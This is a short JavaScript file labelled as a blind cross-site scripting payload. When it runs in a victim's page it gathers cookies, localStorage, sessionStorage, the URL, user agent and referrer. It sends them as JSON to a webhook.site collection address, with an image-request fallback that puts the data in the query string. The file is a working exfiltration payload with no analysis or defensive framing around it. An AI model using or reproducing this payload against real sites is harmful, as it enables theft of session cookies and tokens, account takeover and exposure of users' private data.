
console.log("Blind XSS payload executed!");


const extractedData = {
    timestamp: new Date().toISOString(),
    url: window.location.href,
    userAgent: navigator.userAgent,
    domain: document.domain,
    cookies: document.cookie,
    referrer: document.referrer,
    

    localStorage: {},
    sessionStorage: {}
};


try {
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        extractedData.localStorage[key] = localStorage.getItem(key);
    }
} catch(e) {
    extractedData.localStorage = "Access denied or not available";
}


try {
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        extractedData.sessionStorage[key] = sessionStorage.getItem(key);
    }
} catch(e) {
    extractedData.sessionStorage = "Access denied or not available";
}


fetch('https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(extractedData),
    mode: 'no-cors'
}).catch(error => {
  
    const img = new Image();
    img.src = 'https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa?data=' + encodeURIComponent(JSON.stringify(extractedData));
});

